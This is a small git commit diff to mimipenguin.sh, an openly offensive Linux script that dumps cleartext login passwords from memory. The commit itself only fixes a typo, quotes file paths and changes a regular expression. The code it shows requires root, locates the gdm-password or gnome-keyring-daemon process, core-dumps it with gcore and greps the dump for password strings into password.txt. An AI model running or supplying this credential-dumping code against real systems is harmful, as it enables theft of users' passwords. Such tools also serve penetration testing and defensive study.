e452f3d65bf29e6b1947dd402f3212e887dc051e
hunter gregal <hgregal@nuharborsecurity.com>
2017-03-26 05:29:54 -0400

    tweaks

--- mimipenguin.sh
+++ mimipenguin.sh
@@ -8,7 +8,7 @@
 #root check
 if [[ $EUID -ne 0 ]]; then
 	echo "Root required - You are dumping memory..."
-	echo "Evene mimikatz requires administrator"
+	echo "Even mimikatz requires administrator"
 	exit 1
 fi
 
@@ -17,7 +17,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"Kali"* ]]; then
 	#get gdm-session-worker [pam/gdm-password] process
 	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
 	gcore -o /tmp/dump $PID >& /dev/null
-	strings /tmp/dump.${PID} | egrep '^\$.\$.+$' -B 10 -A 10 > password.txt
+	strings "/tmp/dump.${PID}" | egrep '^\$.\$.+$' -B 10 -A 10 > password.txt
 fi
 
 #If Ubuntu
@@ -25,7 +25,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
 	#get /usr/bin/gnome-keyring-daemon process
 	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
 	gcore -o /tmp/dump $PID >& /dev/null
-	strings /tmp/dump.${PID} | egrep '^/usr/lib/libgck\-1\.so\.0' -B 10 -A 10 > password.txt
+	strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10 > password.txt
 fi
  
 echo "Password located somewhere within password.txt"
